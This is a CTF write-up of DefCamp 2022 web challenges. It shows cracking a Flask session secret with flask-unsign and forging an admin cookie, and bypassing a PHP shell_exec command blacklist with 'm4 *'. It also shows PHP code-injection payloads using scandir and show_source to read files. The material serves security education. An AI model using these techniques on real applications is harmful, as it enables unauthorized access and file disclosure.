Defcamp-ctf22-writeups
writeups of web challenges

1. Webintro
link: 34.159.129.6:30873 Description: Are you an admin?

Note: Access Denied is part of the challenge.

Flag format: CTF{sha256}

Solution:
The website contain a cookie named session whose value is eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgdEAA.3it3aK6Fidz3t4cetERsGDoO7HA

When we base64_decoded it, we got a value like this: {"logged_in":false}� t@�+wh�Dl�:�p

But we can see that the cookie is signed, so we have to unsign it and put that token value in the cookie to get the flag

Server: Werkzeug/2.0.3 Python/3.6.9, So we need to try flask-unsign.

 {'logged_in': False}
To obtain the secret key, we used the following command flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgdEAA.3it3aK6Fidz3t4cetERsGDoO7HA' --wordlist /home/avanthika/Downloads/rockyou.txt --no-literal-eval [*] Session decodes to: {'logged_in': False} [*] Starting brute-forcer with 8 threads.. [+] Found secret key after 128 attempts b'password'

So, we obtained the secret key as password. Now we need to make our own custom session data, for that we can use --sign

eyJsb2dnZWRfaW4iOnRydWV9.YgdMSA.8IA2CQFMGIDO3XcACg3TtJ4WlM8```
Paste the above token in the session cookie to get the flag.

Flag: CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}

Reference:
https://pypi.org/project/flask-unsign/
https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

2. Paracode
link: 34.159.7.96:30039
Description: I do not think that this API needs any sort of security testing as it only executes and retrieves the output of ID and PS commands.

Flag format: CTF{sha256}

Solution:
Opening the link gives the following php code
<?php
require __DIR__ . '/flag.php';
if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

$blackList = array(
  'ss','sc','aa','od','pr','pw','pf','ps','pa','pd','pp','po','pc','pz','pq','pt','pu','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','ls','dd','nl','nk','df','wc', 'du'
);

$valid = true;
foreach($blackList as $blackItem)
{
    if(strpos($_GET['start'], $blackItem) !== false)
    {
         $valid = false;
         break;
    }
}

if(!$valid)
{
  show_source(__FILE__);
  exit;
}

// This will return output only for id and ps. 
if (strlen($_GET['start']) < 5){
  echo shell_exec($_GET['start']);
} else {
  echo "Please enter a valid command";
}

if (False) {
  echo $flag;
}

?>
In this challenge, we can see that the we should find an appropriate 2 letter command to get the flag(given the length should be less than 5)
So, bruteforcing with all the 2 letter command, we found that m4 * command gives the flag.
So, the url becomes http://34.159.7.96:30039/?start=m4%20*
Checking the source page of the site, gives the flag.
$flag = "791b21ee6421993a8e25564227a816ee52e48edb437909cba7e1e80c0579b6be";
Reference:
https://www.davekb.com/browse_computer_tips:linux_two_letter_commands:txt

3. Casual Defence:
link: 35.246.158.241:30568
Description:In light of recent events related to the cyber attack, we have prepared a mirror environment of the defaced website so you can have a look. Moreover, both the mirror and production environments retain a copy of the defacement file and up-to-date security policies that prevent any access to our systems.

Flag format: CTF{sha256}

Solution:
We use the cmd to implement commands in the url. Payloads:
http://35.246.158.241:30568/?cmd=print_r(chr(46));
http://35.246.158.241:30568/?cmd=print_r(scandir(chr(46)));
http://35.246.158.241:30568/?cmd=print_r(current(scandir(chr(46))));
http://35.246.158.241:30568/?cmd=print_r(next(scandir(chr(46))));
http://35.242.219.87:31217/?cmd=print_r(end(scandir(chr(46))));
http://35.246.158.241:30568/?cmd=print_r(array_reverse(scandir(chr(46))));
http://35.246.158.241:30568/?cmd=print_r(next(array_reverse(scandir(chr(46)))));
http://35.246.158.241:30568/?cmd=show_source(next(array_reverse(scandir(chr(46)))));
From the last payload we get the flag, Flag: CTF{40c7bf1cd2186ce4f14720c4243f1e276a8abe49004b788921828f13a026c5f1}

Reference:
Scandir() in php: https://www.w3schools.com/php/func_directory_scandir.asp
PHP Array Functions: https://www.w3schools.com/php/php_ref_array.asp

4. It-support
link:34.89.146.147:30233
Description: Dear , after receiving your penetration testing report and after researching the 4.2.3 vulnerability we would like to consider it as not applicable due to the fact that no data can be exfiltrated from the open ticket platform (regardless of the authentification state) due to fact that the platform is hosted on the internal network with no external access.

Flag format: CTF{sha256}

Solution:
5. Research it
link:35.242.212.223:30240
Description: Recently I hired a team to keep my WordPress updated and secure. It got hacked, the team does not respond, the website seems permanently down and here it is the backup. Tell me more.

Flag format: CTF{sha256}

Solution:
About
writeups of web challenges

